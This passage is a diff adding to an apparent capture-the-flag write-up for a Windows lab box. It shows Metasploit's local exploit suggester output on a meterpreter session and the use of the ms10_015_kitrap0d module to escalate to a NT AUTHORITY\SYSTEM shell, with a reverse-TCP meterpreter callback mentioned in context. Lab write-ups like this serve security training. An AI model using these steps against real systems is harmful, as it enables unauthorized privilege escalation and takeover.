@@ -41,6 +41,35 @@ To work in a more confortable environment we set up a metasploit handler (multi/
 We know have a meterpreter shell with the web service privileges.
 (I tried first to get the meterpreter shell by diretly uploading the windows/meterpreter/reverse_tcp payload to the web server but it produced some errors when executed).  
 
+We use a metasploit post module to scan for possible vulnerabilities.
+```
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.10.5 - Collecting local exploits for x86/windows...
+[*] 10.10.10.5 - 35 exploit checks are being tried...
+[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+```
+
+Some of these vulns allow priv escalation. We try ms10_092 but it doesn't work. So we move to the second one (ms10_015).
+```
+use exploit/windows/local/ms10_015_kitrap0d
+```
+We set the LHOST and the SESSION and we run the exploit, getting a NT AUTHORITY\SYSTEM shell.  
+We can now look for the flags inside the corresponding Administrator's and user's Desktops.
+
 
 
 
